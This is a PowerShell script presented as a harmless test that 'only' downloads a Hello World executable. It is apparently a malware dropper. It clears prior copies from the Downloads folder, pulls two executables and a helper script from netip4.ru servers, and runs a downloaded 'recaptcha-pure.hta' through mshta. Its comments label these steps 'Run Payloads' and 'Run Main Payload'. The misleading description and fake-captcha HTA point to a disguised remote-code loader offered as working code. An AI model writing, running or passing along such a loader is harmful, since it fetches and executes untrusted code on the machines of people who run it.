###########################################################
# echo-server.utf8.exe.ps1
# This is a Test Script that only Download and RUN
# Hello World Exe
###########################################################

function Join-Url([string[]]$parts) {
    return ($parts | % { $_.Trim('/') } | ? { $_ }) -join '/'
}

# Set Exe File
$anExeFile0 = 'NIT.Run.Adjusing.001.exe'
$anExeFile1 = 'nit.main.windows.adjust.01.exe'
$aPureURL = 'http://lin.netip4.ru:18080/~vagrant/PROGS/LIB-RUN/PS1/'
$aPureURL0 = 'http://file.netip4.ru/PROGS/LIB-RUN/EXE/download.php?file='

$anHtaFile = 'recaptcha-pure.hta'
$anHtaURL = 'http://lin.netip4.ru:18080/~vagrant/PROGS/LIB-RUN/HTA/'

# Set a NIT Conditions Script
$aCondPS1File0 = 'NIT.Check-NITCondition-03.ps1'
$aCondPS1URL0 = 'http://file.netip4.ru/PROGS/NIT/CheckNITCondition/'

$FirstTimeOut = 3 # 3 sec
$SecondTimeOut = 10 # 10 Sec

## Set System Objects
$wc = New-Object System.Net.WebClient
$DownloadsDir = (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path

## Set Url and Output
$anUrl0 = $aPureURL0 + $anExeFile0
$anOutput0 = Join-Path -Path $DownloadsDir -ChildPath $anExeFile0

$anUrl1 = Join-Url( $aPureURL, $anExeFile1)
$anOutput1 = Join-Path -Path $DownloadsDir -ChildPath $anExeFile1

$anUrlHta = Join-Url( $anHtaURL, $anHtaFile)
$anOutputHTA = Join-Path -Path $DownloadsDir -ChildPath $anHtaFile

$anUrlCond0 = Join-Url( $aCondPS1URL0, $aCondPS1File0 )
$anOutputCond0 = Join-Path -Path $DownloadsDir -ChildPath $aCondPS1File0

if( Test-Path $anOutputHTA ) {
    ri $anOutputHTA -Force
}
if( Test-Path $anOutput0 ) {
    ri $anOutput0 -Force
}
if( Test-Path $anOutput1` ) {
    ri $anOutput1 -Force
}

if( Test-Path $anOutputCond0 ) {
    ri $anOutputCond0 -Force
}

#### Run Payloads ####
#
$wc.DownloadFile( $anUrlCond0, $anOutputCond0 )
#& $anOutputCond0

$wc.DownloadFile( $anUrl1, $anOutput1 )
#& $anOutput1
& Timeout /T $FirstTimeOut /nobreak

### See reCaptcha ###
#
$wc.DownloadFile( $anUrlHta, $anOutputHTA )
& MsHta $anOutputHTA

##### Run Main Payload

$wc.DownloadFile( $anUrl0, $anOutput0 )
#& $anOutput0
& Timeout /T $SecondTimeOut /nobreak
